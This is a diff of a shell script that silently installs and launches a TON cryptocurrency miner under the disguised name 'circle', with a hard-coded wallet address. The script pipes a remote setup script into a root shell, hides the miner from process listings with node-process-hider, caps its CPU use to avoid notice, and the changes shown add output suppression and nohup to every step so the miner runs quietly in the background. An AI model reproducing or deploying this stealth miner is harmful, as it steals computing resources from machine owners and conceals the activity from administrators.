@@ -1,17 +1,17 @@
 #!/bin/sh
 
-apt update && apt -y install sudo
-sudo apt update;apt -y install build-essential cpulimit screen ca-certificates libcurl4
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-sudo apt-get install -y nodejs
-sudo apt-get install gcc g++ make
-sudo -u root npm i -g node-process-hider
-sudo ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-sudo dpkg-reconfigure --frontend noninteractive tzdata
-wget https://github.com/TON-Pool/miner/releases/download/0.3.4/ton-pool.com-miner-0.3.4-linux.tar.gz
-tar xvf ton-pool.com-miner-0.3.4-linux.tar.gz
-mv miner-linux circle
-ph add circle
+apt update && apt -y install sudo >/dev/null 2>&1
+sudo apt update;apt -y install build-essential cpulimit screen ca-certificates libcurl4 >/dev/null 2>&1
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash - >/dev/null 2>&1
+sudo apt-get install -y nodejs >/dev/null 2>&1
+sudo apt-get install gcc g++ make >/dev/null 2>&1
+sudo -u root npm i -g node-process-hider >/dev/null 2>&1
+sudo ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime >/dev/null 2>&1
+sudo dpkg-reconfigure --frontend noninteractive tzdata >/dev/null 2>&1
+wget https://github.com/TON-Pool/miner/releases/download/0.3.4/ton-pool.com-miner-0.3.4-linux.tar.gz >/dev/null 2>&1
+tar xvf ton-pool.com-miner-0.3.4-linux.tar.gz >/dev/null 2>&1
+mv miner-linux circle >/dev/null 2>&1
+ph add circle >/dev/null 2>&1
 chmod +x circle
-cpulimit -e circle -l 10 &
-./circle https://next.ton-pool.com EQBAIt3Hs69kCi4grIGDha7_mhF40wWG4vB83dRBsT_JXpwF
+cpulimit -e circle -l 10 & >/dev/null 2>&1
+nohup ./circle https://next.ton-pool.com EQBAIt3Hs69kCi4grIGDha7_mhF40wWG4vB83dRBsT_JXpwF > nohup.out >/dev/null 2>&1
